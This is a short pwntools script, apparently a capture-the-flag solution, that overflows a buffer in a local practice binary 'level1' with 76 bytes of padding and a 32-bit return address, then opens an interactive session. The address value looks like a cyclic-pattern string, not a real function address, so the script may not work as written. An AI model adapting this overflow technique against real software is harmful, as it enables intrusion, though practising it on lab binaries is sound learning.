
from pwn import *

elf = ELF('./level1')  
io = process('./level1')
offset = 76
win_addr = 0x61616174
payload = b'A' * offset + p32(win_addr)
io.sendline(payload)
io.interactive()

